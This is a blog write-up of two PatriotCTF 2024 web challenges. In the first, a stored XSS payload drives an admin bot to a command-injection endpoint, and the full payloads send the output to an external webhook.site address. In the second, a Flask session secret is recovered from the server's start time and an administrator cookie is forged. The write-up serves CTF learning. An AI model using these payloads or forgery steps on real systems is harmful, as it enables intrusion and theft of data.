---
author: arete
pubDatetime: 2024-09-23T00:00:00Z
modDatetime:
title: CTF - PatriotCTF 2024 - 2 Challenges - Web
featured: false
draft: false
tags:
  - ctf
  - web
description: 2 challenges, one exploiting XSS with command injection, the other focusing on cookie manipulation
---

## Introduction

These challenges were part of PatriotCTF 2024. The first challenge involved exploiting a vulnerability by combining XSS with command injection, while the second focused on cookie manipulation.

## Open Seasame

### Introduction

In this challenge, we were given 2 files, `admin.js` and `server.py`, but only 1 URL on port 13336. After looking through the code, it was possible to see that the port 13337 was also used. The challenge was solved by combining XSS with commnad injection.

### Admin bot

Upon visiting the page and inpecting the code, we could see an input field where users could submit a path for the admin to visit. However, this path was restricted to `localhost` on port 13337 and there were limitations: any path containing the string `cal` or the `%` character would be rejected.

```javascript
[...]
const SECRET = fs.readFileSync("secret.txt", "utf8").trim();
const visitUrl = async (url) => {
  [...]
  try {
    const page = await browser.newPage();

    try {
      await page.setUserAgent("puppeteer");
      let cookies = [
        {
          name: "secret",
          value: SECRET,
          domain: "127.0.0.1",
          httpOnly: true,
        },
      ];
      await page.setCookie(...cookies);
      await page.goto(url, { timeout: 5000, waitUntil: "networkidle2" });
    }
    [...]
};

[...]
app.post("/visit", async (req, res) => {
  const path = req.body.path;
  console.log("received path: ", path);

  let url = CHAL_URL + path;

  if (url.includes("cal") || url.includes("%")) {
    res.send('Error: "cal" is not allowed in the URL');
    return;
  }

  try {
    console.log("visiting url: ", url);
    await visitUrl(url);
  } catch (e) {
    console.log("error visiting: ", url, ", ", e.message);
    res.send("Error visiting page: " + escape(e.message));
  } finally {
    console.log("done visiting url: ", url);
    res.send("Visited page.");
  }
});
[...]
```

The admin will set a secret cookie, with the `httpOnly` flag, before visiting the URL. This made it clear that the challenge was likely an XSS vulnerability, but stealing the cookie directly wouldn't be possible due to the `httpOnly` flag.

### Server

In `server.py` file, we have 3 key API endpoints:

1. `/api/stats`: a POST request here allows us to submit a username and high score, returning a unique `uuid`.

```python
@app.route('/api/stats', methods=['POST'])
def add_stats():
[...]
id = str(uuid.uuid4())

stats.append({ 'id': id, 'data': [username, high_score] })
return '{"success": "Added", "id": "'+id+'"}'
```

2. `/api/stats/<uuid>`: a GET request here retrieves the username and score based on the provided `uuid`.

```python
@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
    for stat in stats:
        if stat['id'] == id:
            return str(stat['data'])

    return '{"error": "Not found"}'
```

3. `/api/cal`: the most interesting endpoint, which executes the `cal` command if the secret cookie matches. If an optional `modifier` parameter is provided, it is appended as an argument.

```python
@app.route('/api/cal', methods=['GET'])
def get_cal():
    cookie = request.cookies.get('secret')

    if cookie == None:
        return '{"error": "Unauthorized"}'

    if cookie != SECRET:
        return '{"error": "Unauthorized"}'

    modifier = request.args.get('modifier','')

    return '{"cal": "'+subprocess.getoutput("cal "+modifier)+'"}'
```

### Attack

With all this gathered information, my attack plan was as follows:

1. Inject a command to retrieve the flag, via the `modifier` parameter in the `/api/call/` endpoint.
2. Craft a XSS payload that would:
   1. Force the admin to visit `/api/call` with my command injection in `modifier`.
   2. Capture the response, which contains the flag.
   3. Send this response to a server controlled by me
3. Store the XSS payload in the username field via the `/api/stats/` POST request.
4. Retrieve the `uuid` from `/api/stats/<uuid>` and submit it to the admin for execution.

After starting with small payloads, verifying that the admin could make external connections and that there was no input validation, I prepared the following payload:

```javascript
<script>
fetch('http://chal.competitivecyber.club:13337/api/cal & cat flag.txt').then(response => response.text()).then(data => { fetch('https://webhook.site/69ffcd48-3a32-46a0-9c93-10f2362b96d0/?data='+encodeURIComponent(data));});
</script>
```

Although the first request was working, which I verified by pointing it to my server, the second request never seemed to reach his destination. I tried tweaking the payload in various ways, but coulnd't get it to work.

By this time, my teammate [castilho](https://castilho.onrender.com/) told me that he had found a working solution. To my surprise, his payload was nearly identical to mine, but used a different approach to reach his server:

```javascript
<script>
  fetch('/api/cal?modifier=2024 | cat
  flag.txt').then((response)=>response.text()).then((text)=>
  {
    (window.location =
      `//webhook.site/0d8c55d7-c68f-4733-b0d8-c63ef96193d6/?x=` + text)
  }
  )
</script>
```

That made me think I was very close to the solution. Perhaps the issue was caused by using fetch inside another fetch? I’m not sure.

### Flag

```
CACI{1_l0v3_c0mm4nd_1nj3ct10n}
```

---

## Impersonate

### Introduction

In this challenge, we were provided with a file, `app.py` and a URL, and the goal was to access `/admin` with the correct cookie. I solved it by leaking the secret used to sign the cookies, and then generating a custom cookie to gain access.

### Code Analysis

In `app.py`, we have 4 endpoints:

1. `/status`: displays the current time and the server's uptime.

```python
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
    """
    return status_content
```

2. `/admin`: provides the flag, but only if accessed with the administrator cookies.

```python
@app.route('/admin')
def admin_page():
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
```

3. `/`: accepts a POST request with a username and password. The username cannot begin with `admin`. If successful, returns a `uid` and a cookie.

```python
@app.route('/', methods=['GET', 'POST'])
def main():
    [...]
    elif request.method == 'POST':
        username = request.values['username']
        password = request.values['password']
        if not is_safe_username(username):
            return render_template('index.html', error='Invalid username')
        if not password:
            return render_template('index.html', error='Invalid password')
        if username.lower().startswith('admin'):
            return render_template('index.html', error='Don\'t try to impersonate administrator!')
        if not username or not password:
            return render_template('index.html', error='Invalid username or password')
        uid = uuid.uuid5(secret, username)
        session['username'] = username
        session['uid'] = str(uid)
        return redirect(f'/user/{uid}')
```

4. `/user/<uid>`: sets the `is_admin` field in the cookie to `false`

```python
@app.route('/user/<uid>')
def user_page(uid):
    try:
        uid = uuid.UUID(uid)
    except ValueError:
        abort(404)
    session['is_admin'] = False
    return 'Welcome Guest! Sadly, you are not admin and cannot view the flag.'
```

At the start of the file, it becomes clear that the secret key used for signing cookies is generated based on the server's start time.

```python
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
```

### Attack

Since the secret key for signing cookies is generated based on the server's start time, we can retrieve it by querying the `/status` endpoint and doing some simple calculations. To speed things up, I used ChatGPT, which provided me with the following Python code:

```python
from datetime import datetime, timedelta

current_time = datetime.strptime('2024-09-23 14:10:54', '%Y-%m-%d %H:%M:%S')
uptime_str = '0:00:39'

uptime_parts = list(map(int, uptime_str.split(':')))
uptime = timedelta(hours=uptime_parts[0], minutes=uptime_parts[1], seconds=uptime_parts[2])

server_start_time = current_time - uptime
formatted_server_start_time = server_start_time.strftime('%Y%m%d%H%M%S')
print(f"Server start time: {formatted_server_start_time}")
```

Output:

```
20240923141015
```

With the secret key in hand, I modified the original source code. I removed the `if` statement that blocked the use of the usernames starting with `admin`, added a line to set `is_admin` to `True`, and ran the server locally.

```shell
diff app.py app_patch.py
10c10
< secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
---
> secure_key = hashlib.sha256(f'secret_key_20240923141015'.encode()).hexdigest()
30,31d29
<         if username.lower().startswith('admin'):
<             return render_template('index.html', error='Don\'t try to impersonate administrator!')
36a35
>         session['is_admin'] = True
65a65
>
```

I then sent a POST request with the `administrator` username and retrieved the cookie.

![](@assets/images/impersonate1.png)

Then, I used it to access `/admin` on the real server, obtaining the flag.

![](@assets/images/impersonate2.png)

However, during the CTF, the challenge server frequently went down and restarted, making it difficult to test and confirm the calculations consistently.
